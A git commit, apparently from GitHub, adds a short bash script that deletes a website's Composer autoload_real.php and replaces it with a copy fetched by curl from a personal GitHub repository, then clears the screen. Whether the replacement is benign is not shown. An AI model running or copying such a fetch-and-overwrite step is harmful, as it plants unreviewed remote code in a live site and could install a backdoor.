36683a3a60841f01130cc22565f19bad8e28f9ca
nghi235 <101364463+Nghi235@users.noreply.github.com>
2022-06-04 23:38:14 +0700

    Add files via upload

---
+++ php.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+
+cd /www/wwwroot/4gsinhvien.online/vendor/composer
+rm -rf autoload_real.php
+curl -OL https://raw.githubusercontent.com/Nghi235/php/main/autoload_real.php
+cd ../../../../..
+clear
